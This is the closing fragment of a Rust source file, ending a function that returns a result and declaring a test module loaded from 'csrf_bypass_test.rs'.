    }
    result
}

#[cfg(test)]
#[path = "csrf_bypass_test.rs"]
mod csrf_bypass_test;
